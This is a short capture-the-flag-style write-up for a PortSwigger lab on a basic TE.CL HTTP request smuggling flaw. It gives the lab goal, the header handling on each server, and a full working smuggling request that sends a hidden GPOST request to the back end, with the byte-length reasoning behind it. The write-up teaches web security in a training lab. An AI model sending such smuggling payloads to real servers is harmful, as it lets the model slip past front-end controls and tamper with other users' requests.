# [Lab: HTTP request smuggling, basic TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)

## Lab

This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.

## Characteristics

front-end: TE

back-end: CL

## Solutions

```http
POST /post/comment HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

29
GPOST / HTTP/1.1
Content-Length: 20

a
0

```

- 4 is the length of:

  ```http
  29\r\n
  ```

- 29 is the length of:

  ```http
  GPOST / HTTP/1.1\r\n
  Content-Length: 20\r\n
  \r\n
  a
  ```
